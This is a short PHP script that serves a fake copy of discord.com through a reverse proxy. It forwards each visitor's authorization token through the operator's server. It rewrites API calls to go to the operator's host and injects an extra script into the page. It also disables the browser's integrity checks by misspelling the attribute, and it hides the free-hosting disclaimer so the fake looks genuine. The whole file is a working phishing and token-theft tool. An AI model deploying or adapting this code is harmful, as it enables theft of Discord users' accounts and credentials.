<?php
require('config.php');
$headers = getallheaders();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://discord.com' . $_SERVER['REQUEST_URI']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-type: ' . $headers['content-type'],
    'authorization: ' . $headers['authorization']
));
$output = curl_exec($ch);
$output = str_replace('//discord.com/api', '//' . $_SERVER['HTTP_HOST'] . '/api', $output);
$output = str_replace('<div id="app-mount"></div>', '<script src="/assets/76be4d2b12a86ba3d932.js"></script><div id="app-mount"></div>', $output);
$output = str_replace('integrity', 'integity', $output);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
$effectiveUrl = str_replace('https://discord.com', '', curl_getinfo($ch, CURLINFO_EFFECTIVE_URL));
curl_close($ch);
if ($effectiveUrl !== $_SERVER['REQUEST_URI']) {
    header('location: ' . $effectiveUrl);
    die();
}
header('content-type: ' . $contentType);
http_response_code($httpCode);

echo $output;

?>
<script>
    document.addEventListener('DOMContentLoaded', () => {
        var disclaimer = document.querySelector("img[alt='www.000webhost.com']");
        if (disclaimer) {
            disclaimer.remove();
        }
    });
</script>
